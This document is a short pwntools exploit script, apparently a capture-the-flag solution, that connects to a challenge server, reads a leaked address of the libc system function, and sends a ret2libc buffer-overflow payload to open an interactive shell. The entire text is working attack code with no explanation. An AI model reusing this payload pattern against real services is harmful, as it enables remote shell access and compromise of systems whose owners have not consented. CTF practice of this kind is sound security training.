from pwn import *

p = remote('sharkyctf.xyz', 20334)
system = int(p.recvline()[11:],16)
print hex(system)
bin_sh = system + 0x140ecf
buf = 'a'*36
payload=''
payload += buf	
payload += p32(system)
payload += "AAAA"
payload += p32(bin_sh)


p.sendline(payload)
p.interactive()
